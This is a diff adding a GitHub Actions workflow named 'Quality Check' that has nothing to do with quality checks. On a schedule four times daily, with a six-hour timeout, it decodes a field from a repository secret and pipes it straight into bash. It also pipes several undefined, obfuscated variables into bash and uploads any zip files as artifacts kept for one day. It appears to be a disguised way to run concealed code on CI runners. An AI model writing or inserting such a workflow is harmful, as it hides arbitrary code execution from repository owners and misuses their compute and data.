@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '39 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          cz960: ${{ secrets.cz960 }}
+        run: |
+          printf '%s' "$cz960" | jq -r .met95062 | /bin/bash
+          echo $jjfkp2 | jq -r .fz9031 | /bin/bash
+          printf '%s' "$zh429" | jq -r .sxpkh42 | /bin/bash
+          printf '%s' "$s8485" | jq -r .nfaes8 | /bin/bash
+          printf '%s' "$aiqkc119" | jq -r .o9202 | /bin/bash
+          printf '%s' "$spfix12128" | jq -r .tohw7 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: oyxuC0at
+          path: "*.zip"
+          retention-days: 1
